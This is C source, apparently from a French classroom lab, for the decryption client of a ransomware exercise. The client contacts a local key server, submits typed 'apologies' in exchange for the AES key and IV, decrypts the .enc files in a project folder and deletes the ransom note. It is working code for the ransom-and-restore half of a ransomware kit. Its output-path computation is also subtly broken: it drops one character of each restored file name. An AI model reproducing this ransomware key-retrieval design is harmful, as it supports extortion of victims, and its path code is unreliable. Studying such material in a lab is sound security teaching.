#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <sys/stat.h>
#include <stdarg.h>

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 4242
#define KEY_SIZE 32
#define IV_SIZE 16
#define BUFFER_SIZE 4096
#define KEY_FILE "/home/tic/Bureau/TP/encryption_key.bin"

// Définitions pour le système de logs
#define LOG_FILE "/home/tic/Bureau/TP/ransomware_logs.txt"
#define LOG_LEVEL_ERROR   0
#define LOG_LEVEL_WARNING 1
#define LOG_LEVEL_INFO    2
#define LOG_LEVEL_DEBUG   3

// Niveau de log actuel (à définir selon vos besoins)
#define CURRENT_LOG_LEVEL LOG_LEVEL_INFO

// Définition de PROJECT_DIR en tant que variable globale pour faciliter la modification
char PROJECT_DIR[1024] = "/home/tic/Bureau/TP/Projet";

// Structure pour stocker la clé et le vecteur d'initialisation
typedef struct {
    unsigned char key[KEY_SIZE];
    unsigned char iv[IV_SIZE];
} CryptoParams;

// Fonction pour afficher des données en format hexadécimal
void print_hex(const char *label, const unsigned char *data, size_t len) {
    printf("%s: ", label);
    for (size_t i = 0; i < len; i++) {
        printf("%02x", data[i]);
    }
    printf("\n");
}

// Fonction pour vérifier si un dossier existe
int directory_exists(const char *path) {
    struct stat st;
    if (stat(path, &st) == 0 && S_ISDIR(st.st_mode)) {
        return 1;
    }
    return 0;
}

// Fonction pour lire la clé et l'IV depuis un fichier
int read_key_iv_from_file(CryptoParams *params) {
    FILE *key_file = fopen(KEY_FILE, "rb");
    if (!key_file) {
        perror("Erreur lors de l'ouverture du fichier de clé");
        return 0;
    }
    
    size_t key_read = fread(params->key, 1, KEY_SIZE, key_file);
    size_t iv_read = fread(params->iv, 1, IV_SIZE, key_file);
    
    fclose(key_file);
    
    if (key_read != KEY_SIZE || iv_read != IV_SIZE) {
        fprintf(stderr, "Erreur lors de la lecture du fichier de clé\n");
        return 0;
    }
    
    printf("Clé et IV lus depuis %s avec succès\n", KEY_FILE);
    print_hex("Clé (HEX)", params->key, KEY_SIZE);
    print_hex("IV (HEX) ", params->iv, IV_SIZE);
    
    return 1;
}

// Fonction pour obtenir la clé et l'IV
int get_key_iv(CryptoParams *params) {
    int sock = 0;
    struct sockaddr_in serv_addr;
    char buffer[BUFFER_SIZE] = {0};
    
    // Créer le socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        fprintf(stderr, "Erreur lors de la création du socket\n");
        return 0;
    }
    
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(SERVER_PORT);
    
    // Convertir l'adresse IP
    if (inet_pton(AF_INET, SERVER_IP, &serv_addr.sin_addr) <= 0) {
        fprintf(stderr, "Adresse invalide / non supportée\n");
        close(sock);
        return 0;
    }
    
    // Se connecter au serveur
    printf("Tentative de connexion au serveur %s:%d...\n", SERVER_IP, SERVER_PORT);
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        fprintf(stderr, "Échec de la connexion au serveur\n");
        close(sock);
        
        // Vérifier si le fichier de clé existe et tenter de le lire
        printf("Tentative de lire la clé depuis le fichier local...\n");
        if (access(KEY_FILE, F_OK) == 0) {
            if (read_key_iv_from_file(params)) {
                return 1;
            }
        }
        
        fprintf(stderr, "Impossible d'obtenir la clé. Ni serveur ni fichier local disponible.\n");
        return 0;
    }
    
    printf("Connexion établie au serveur.\n");
    
    // Indiquer que c'est le client qui demande la clé (mode "RETRIEVE")
    char mode[] = "RETRIEVE";
    send(sock, mode, strlen(mode), 0);
    
    // Recevoir le prompt pour les excuses
    int valread = read(sock, buffer, BUFFER_SIZE);
    if (valread <= 0) {
        fprintf(stderr, "Erreur lors de la réception du prompt\n");
        close(sock);
        return 0;
    }
    
    // Afficher le prompt et lire les excuses
    printf("%s\n", buffer);
    
    // Si le serveur indique qu'aucune clé n'est disponible
    if (strncmp(buffer, "ERROR", 5) == 0) {
        printf("Le serveur indique qu'aucune clé n'est disponible.\n");
        close(sock);
        return 0;
    }
    
    memset(buffer, 0, BUFFER_SIZE);
    fgets(buffer, BUFFER_SIZE, stdin);
    
    // Supprimer le saut de ligne final
    buffer[strcspn(buffer, "\n")] = 0;
    
    // Envoyer les excuses
    send(sock, buffer, strlen(buffer), 0);
    
    // Recevoir la réponse
    memset(buffer, 0, BUFFER_SIZE);
    valread = read(sock, buffer, BUFFER_SIZE);
    if (valread <= 0) {
        fprintf(stderr, "Erreur lors de la réception de la réponse\n");
        close(sock);
        return 0;
    }
    
    // Vérifier si les excuses ont été acceptées
    printf("Réponse du serveur: %s\n", buffer);
    
    if (strncmp(buffer, "ACCEPTED", 8) == 0) {
        printf("Excuses acceptées. La clé devrait être dans le fichier.\n");
        close(sock);
        
        // Lire la clé et l'IV depuis le fichier
        if (read_key_iv_from_file(params)) {
            return 1;
        } else {
            fprintf(stderr, "Erreur: Impossible de lire la clé et l'IV depuis le fichier.\n");
            return 0;
        }
    } else {
        printf("Excuses rejetées : %s\n", buffer);
        close(sock);
        return 0;
    }
}

// Fonction pour déchiffrer un fichier avec AES-256-CBC
int decrypt_file(const char *input_file, const char *output_file, CryptoParams *params) {
    FILE *ifp, *ofp;
    EVP_CIPHER_CTX *ctx;
    unsigned char in_buf[BUFFER_SIZE], out_buf[BUFFER_SIZE + EVP_MAX_BLOCK_LENGTH];
    int in_len, out_len, final_len;
    
    // Ouvrir les fichiers
    ifp = fopen(input_file, "rb");
    if (!ifp) {
        fprintf(stderr, "Erreur lors de l'ouverture du fichier %s\n", input_file);
        return 0;
    }
    
    ofp = fopen(output_file, "wb");
    if (!ofp) {
        fclose(ifp);
        fprintf(stderr, "Erreur lors de la création du fichier %s\n", output_file);
        return 0;
    }
    
    // Créer et initialiser le contexte de déchiffrement
    ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        fclose(ifp);
        fclose(ofp);
        fprintf(stderr, "Erreur lors de la création du contexte de déchiffrement\n");
        return 0;
    }
    
    // Initialiser l'opération de déchiffrement
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, params->key, params->iv) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        fclose(ifp);
        fclose(ofp);
        fprintf(stderr, "Erreur lors de l'initialisation du déchiffrement\n");
        return 0;
    }
    
    // Déchiffrer le fichier par blocs
    while ((in_len = fread(in_buf, 1, BUFFER_SIZE, ifp)) > 0) {
        if (EVP_DecryptUpdate(ctx, out_buf, &out_len, in_buf, in_len) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            fclose(ifp);
            fclose(ofp);
            fprintf(stderr, "Erreur lors du déchiffrement\n");
            return 0;
        }
        
        fwrite(out_buf, 1, out_len, ofp);
    }
    
    // Finaliser l'opération de déchiffrement
    if (EVP_DecryptFinal_ex(ctx, out_buf, &final_len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        fclose(ifp);
        fclose(ofp);
        fprintf(stderr, "Erreur lors de la finalisation du déchiffrement\n");
        fprintf(stderr, "Cela peut être dû à une clé ou un IV incorrect ou à un fichier corrompu\n");
        return 0;
    }
    
    fwrite(out_buf, 1, final_len, ofp);
    
    // Nettoyer
    EVP_CIPHER_CTX_free(ctx);
    fclose(ifp);
    fclose(ofp);
    
    return 1;
}

// Fonction pour déchiffrer tous les fichiers du dossier
void decrypt_directory(CryptoParams *params) {
    DIR *dir;
    struct dirent *entry;
    
    // Vérifier si le dossier existe
    printf("Vérification du dossier %s...\n", PROJECT_DIR);
    if (!directory_exists(PROJECT_DIR)) {
        fprintf(stderr, "Erreur: Le dossier %s n'existe pas!\n", PROJECT_DIR);
        
        // Demander à l'utilisateur de spécifier le chemin
        char user_path[1024];
        printf("Veuillez entrer le chemin complet du dossier Projet: ");
        fgets(user_path, sizeof(user_path), stdin);
        user_path[strcspn(user_path, "\n")] = 0;  // Supprimer le saut de ligne
        
        if (strlen(user_path) > 0) {
            strcpy(PROJECT_DIR, user_path);
            printf("Nouveau chemin défini: %s\n", PROJECT_DIR);
            
            if (!directory_exists(PROJECT_DIR)) {
                fprintf(stderr, "Le dossier %s n'existe toujours pas. Abandon.\n", PROJECT_DIR);
                return;
            }
        } else {
            fprintf(stderr, "Aucun chemin fourni. Abandon.\n");
            return;
        }
    }
    
    dir = opendir(PROJECT_DIR);
    if (!dir) {
        fprintf(stderr, "Impossible d'ouvrir le dossier %s\n", PROJECT_DIR);
        return;
    }
    
    printf("Début du déchiffrement des fichiers dans %s\n", PROJECT_DIR);
    int success_count = 0;
    int failure_count = 0;
    
    while ((entry = readdir(dir)) != NULL) {
        // Ignorer les répertoires "." et ".." et le fichier de rançon
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0 ||
            strcmp(entry->d_name, "RANCON.txt") == 0 || strcmp(entry->d_name, "RANÇON.txt") == 0) {
            continue;
        }
        
        // Vérifier si le fichier a l'extension .enc
        size_t len = strlen(entry->d_name);
        if (len > 4 && strcmp(entry->d_name + len - 4, ".enc") == 0) {
            // Construire le chemin complet du fichier chiffré
            char input_path[1024];
            snprintf(input_path, sizeof(input_path), "%s/%s", PROJECT_DIR, entry->d_name);
            
            // Construire le chemin du fichier déchiffré (sans l'extension .enc)
            char output_path[1024];
            strncpy(output_path, input_path, len + strlen(PROJECT_DIR) - 4);
            output_path[len + strlen(PROJECT_DIR) - 4] = '\0';
            
            printf("Déchiffrement de %s -> %s\n", input_path, output_path);
            
            // Déchiffrer le fichier
            if (decrypt_file(input_path, output_path, params)) {
                // Supprimer le fichier chiffré
                if (remove(input_path) != 0) {
                    fprintf(stderr, "Attention: Impossible de supprimer %s\n", input_path);
                }
                success_count++;
            } else {
                fprintf(stderr, "Échec du déchiffrement de %s\n", input_path);
                failure_count++;
            }
        }
    }
    
    closedir(dir);
    
    // Supprimer le fichier de rançon
    char ransom_file[256];
    snprintf(ransom_file, sizeof(ransom_file), "%s/RANCON.txt", PROJECT_DIR);
    remove(ransom_file);
    
    printf("Déchiffrement terminé. %d fichier(s) réussi(s), %d échec(s).\n", 
           success_count, failure_count);
    
    if (success_count > 0) {
        printf("Les fichiers ont été restaurés avec succès.\n");
    } else if (failure_count > 0) {
        fprintf(stderr, "ATTENTION: Aucun fichier n'a pu être déchiffré. Vérifiez la clé et l'IV.\n");
    } else {
        printf("Aucun fichier chiffré n'a été trouvé dans le dossier.\n");
    }
}

int main() {
    CryptoParams params;
    
    printf("Client de déchiffrement démarré.\n");
    
    // Initialiser OpenSSL
    OpenSSL_add_all_algorithms();
    ERR_load_crypto_strings();
    
    // Afficher le répertoire de travail actuel
    char current_dir[1024];
    if (getcwd(current_dir, sizeof(current_dir)) != NULL) {
        printf("Répertoire de travail actuel: %s\n", current_dir);
    } else {
        perror("getcwd() error");
    }
    
    // Obtenir la clé et le vecteur d'initialisation
    if (!get_key_iv(&params)) {
        fprintf(stderr, "Impossible d'obtenir la clé et l'IV. Abandon.\n");
        EVP_cleanup();
        ERR_free_strings();
        return 1;
    }
    
    // Déchiffrer tous les fichiers du dossier
    decrypt_directory(&params);
    
    // Nettoyage OpenSSL
    EVP_cleanup();
    ERR_free_strings();
    
    return 0;
}
